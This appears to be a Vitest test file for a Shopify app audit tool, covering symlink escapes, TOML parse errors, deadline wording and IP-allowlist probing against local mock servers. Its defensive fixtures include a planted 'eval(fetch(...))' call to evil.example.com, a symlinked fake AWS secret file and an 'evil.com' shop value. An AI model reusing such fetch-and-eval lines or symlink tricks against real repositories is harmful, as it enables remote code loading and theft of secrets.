import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { mkdtemp, mkdir, rm, symlink, writeFile } from "node:fs/promises";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import os from "node:os";
import path from "node:path";
import { loadProject, MAX_FILE_BYTES } from "../src/config.js";
import { deadlinePhrase } from "../src/deadlines.js";
import { probeHeaders, type ProbeOptions } from "../src/probe/checks.js";
import { verifyIpAllowlist } from "../src/probe/ip-allowlist.js";
import { toMarkdown, toText } from "../src/report/format.js";
import { runStaticChecks } from "../src/static/checks.js";
import { SourceIndex } from "../src/static/scan.js";
import type { Report } from "../src/types.js";

const APP_TOML = 'client_id = "x"\nname = "t"\n';
const THEME_TOML = 'name = "t"\ntype = "theme"\n';

async function tmpApp(): Promise<string> {
  const dir = await mkdtemp(path.join(os.tmpdir(), "saa-"));
  await mkdir(path.join(dir, "extensions/t/blocks"), { recursive: true });
  await writeFile(path.join(dir, "shopify.app.toml"), APP_TOML);
  await writeFile(path.join(dir, "extensions/t/shopify.extension.toml"), THEME_TOML);
  return dir;
}

describe("hostile repositories", () => {
  const dirs: string[] = [];
  afterAll(() => Promise.all(dirs.map((d) => rm(d, { recursive: true, force: true }))));

  it("doesn't follow symlinks out of the app directory", async () => {
    const outside = await mkdtemp(path.join(os.tmpdir(), "saa-outside-"));
    const dir = await tmpApp();
    dirs.push(outside, dir);
    await writeFile(path.join(outside, "secret.js"), 'eval(fetch("https://evil.example.com"))');
    await symlink(outside, path.join(dir, "extensions/t/blocks/out"));
    await symlink(path.join(outside, "secret.js"), path.join(dir, "extensions/t/blocks/link.js"));
    const project = await loadProject(dir);
    const index = new SourceIndex(project);
    expect(project.files.some((f) => f.includes("/out/"))).toBe(false);
    for (const f of project.files) expect(await index.read(f)).not.toContain("evil.example.com");
  });

  it("refuses a shopify.app.toml that links outside the app", async () => {
    const outside = await mkdtemp(path.join(os.tmpdir(), "saa-outside-"));
    const dir = await mkdtemp(path.join(os.tmpdir(), "saa-"));
    dirs.push(outside, dir);
    await writeFile(path.join(outside, "creds"), "AWS_SECRET=hunter2\n");
    await symlink(path.join(outside, "creds"), path.join(dir, "shopify.app.toml"));
    const project = await loadProject(dir).catch((e: Error) => e);
    if (project instanceof Error) expect(project.message).toMatch(/outside the app directory/);
    else expect(project.config).toBeUndefined();
    await expect(loadProject(dir, "shopify.app.toml")).rejects.toThrow(/outside the app directory/);
  });

  it("names the file and doesn't echo its contents on a TOML error", async () => {
    const dir = await mkdtemp(path.join(os.tmpdir(), "saa-"));
    dirs.push(dir);
    await writeFile(path.join(dir, "shopify.app.toml"), 'client_id = "sensitive-value\n');
    const err = await loadProject(dir).catch((e: Error) => e);
    expect(String(err)).toMatch(/Can't parse shopify.app.toml/);
    expect(String(err)).not.toContain("sensitive-value");
  });

  it("skips oversized files instead of loading them", async () => {
    const dir = await tmpApp();
    dirs.push(dir);
    await writeFile(path.join(dir, "extensions/t/blocks/big.js"), `eval(x);\n${"a".repeat(MAX_FILE_BYTES)}`);
    const findings = await runStaticChecks(await loadProject(dir), "public", "2026-11-23");
    expect(findings.some((f) => f.locations?.some((l) => l.file.endsWith("big.js")))).toBe(false);
  });

  it("reports correct line numbers", async () => {
    const dir = await tmpApp();
    dirs.push(dir);
    await writeFile(path.join(dir, "extensions/t/blocks/a.js"), "\n\n\nel.innerHTML = x;\n");
    const [m] = await new SourceIndex(await loadProject(dir)).search(/innerHTML/);
    expect(m.line).toBe(4);
  });
});

describe("passed deadlines", () => {
  it("phrases past, current and future dates", () => {
    expect(deadlinePhrase("2026-11-20", "2026-11-23")).toBe("in effect since 2026-11-20");
    expect(deadlinePhrase("2026-11-23", "2026-11-23")).toBe("takes effect today (2026-11-23)");
    expect(deadlinePhrase("2026-12-01", "2026-11-23")).toBe("2026-12-01 (in 8 days)");
  });

  it("words manual checks by the audit date", async () => {
    const project = await loadProject("test/fixtures/compliant-app");
    const msg = async (today: string) =>
      (await runStaticChecks(project, "public", today)).find((f) => f.id === "IP_ALLOWLIST")?.message;
    expect(await msg("2026-11-18")).toMatch(/^Required from November 20, 2026/);
    expect(await msg("2026-11-23")).toMatch(/^Required now/);
  });

  it("marks enforced requirements in reports", () => {
    const report: Report = {
      tool: "shopify-app-audit",
      version: "0",
      generatedAt: "",
      today: "2026-11-23",
      distribution: "public",
      findings: [{ id: "IP_ALLOWLIST", title: "IP allowlist", status: "info", message: "m", deadlineId: "ip-allowlist-public" }],
      deadlines: [{ id: "a", date: "2026-11-20", scope: ["public"], feature: "IP allowlist", consequence: "c", source: "s" }],
    };
    // eslint-disable-next-line no-control-regex
    const text = toText(report).replace(/\x1b\[[0-9;]*m/g, "");
    expect(text).toContain("enforced: in effect since 2026-11-20");
    expect(text).not.toContain("days ago");
    expect(text).toContain("app.enclave.ai");
    expect(toMarkdown(report)).toContain("in effect since 2026-11-20");
  });
});

describe("hostile probe targets", () => {
  let server: Server;
  let other: Server;
  let url: string;
  let status = 403;
  let lastToken: string | undefined;
  let body: string | undefined;
  beforeAll(async () => {
    server = createServer((req, res) => {
      if (req.url?.startsWith("/admin")) {
        lastToken = req.headers["x-shopify-access-token"] as string;
        res.writeHead(status, { "content-type": "application/json" });
        return res.end(body ?? (status === 200 ? '{"data":{"shop":{"id":"1"}}}' : '{"errors":"x"}'));
      }
      res.writeHead(302, { location: `http://127.0.0.1:${(other.address() as AddressInfo).port}/login` });
      res.end();
    });
    other = createServer((_req, res) => res.writeHead(200, { "content-type": "text/html" }).end("<title>Login</title>"));
    await new Promise<void>((r) => other.listen(0, "127.0.0.1", r));
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    url = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  });
  afterAll(() => {
    server.close();
    other.close();
  });

  it("doesn't grade headers of a page on another origin", async () => {
    const opts: ProbeOptions = {
      target: url,
      webhookPaths: [],
      proxyPaths: [],
      appPaths: ["/app"],
      shop: "a.myshopify.com",
      otherShop: "b.myshopify.com",
      timeoutMs: 5000,
    };
    const [f] = await probeHeaders(opts);
    expect(f.status).toBe("skip");
    expect(f.message).toContain("redirected to");
  });

  const verify = (distribution: "public" | "custom" = "public") =>
    verifyIpAllowlist({
      shop: "dev.myshopify.com",
      accessToken: "shpat_test",
      apiVersion: "2026-01",
      distribution,
      timeoutMs: 5000,
      endpoint: `${url}/admin/api/2026-01/graphql.json`,
    });

  it("passes the allowlist when Shopify returns 403", async () => {
    status = 403;
    expect((await verify()).status).toBe("pass");
    expect(lastToken).toBe("shpat_test");
  });
  it("fails a public app whose token works from anywhere", async () => {
    status = 200;
    expect((await verify()).status).toBe("fail");
    expect((await verify("custom")).status).toBe("warn");
  });
  it("is inconclusive on a bad token", async () => {
    status = 401;
    expect((await verify()).status).toBe("info");
  });
  it("doesn't credit the allowlist when Shopify rejects the token", async () => {
    status = 403;
    body = '{"errors":"Non-expiring access tokens are no longer accepted"}';
    expect((await verify()).status).toBe("info");
    body = undefined;
  });
  it("doesn't fail on a 2xx without shop data", async () => {
    status = 200;
    body = "";
    expect((await verify()).status).toBe("info");
    body = undefined;
  });
  it("only sends tokens to myshopify.com domains", async () => {
    await expect(
      verifyIpAllowlist({ shop: "evil.com/x", accessToken: "t", apiVersion: "2026-01", distribution: "public", timeoutMs: 1000 }),
    ).rejects.toThrow(/myshopify/);
  });
});
